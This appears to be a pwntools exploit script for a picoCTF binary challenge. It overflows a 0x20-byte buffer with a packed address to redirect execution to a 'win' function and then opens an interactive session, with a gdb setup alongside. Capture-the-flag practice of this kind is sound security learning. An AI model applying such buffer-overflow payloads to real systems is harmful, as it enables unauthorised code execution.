#!/usr/bin/python3
from pwn import *

REMOTE = False
GEF = False
ip = 'mimas.picoctf.net'
port = 60068
filepath = './chall'
tty = ''
breakpoints = ['win']

gdbscript = '''
c
'''
gdbscript = "\n".join(['b *' + bp for bp in breakpoints]) + gdbscript

elf = context.binary = ELF(filepath, checksec=False)
context.terminal = ['tmux', 'splitw', '-v', '-F' '#{pane_pid}', '-P']
if REMOTE is True:
    p = remote(ip, port)
else:
    # p = process(filepath)
    # gdb.attach(p)
    ### OR if you want to start the process with gdb instead of attaching
    p = gdb.debug(filepath, gdbscript=gdbscript)

payload = b'\x01' * 0x20 + p64(0x4011A0)
print(p.recvuntil(b'Enter your choice: ').decode())
print('Sending "2"')
p.sendline(b'2')
print(p.recvuntil(b'Data for buffer: ').decode())
print('Sending payload')
p.sendline(payload)
p.sendline(b'4')
p.interactive()
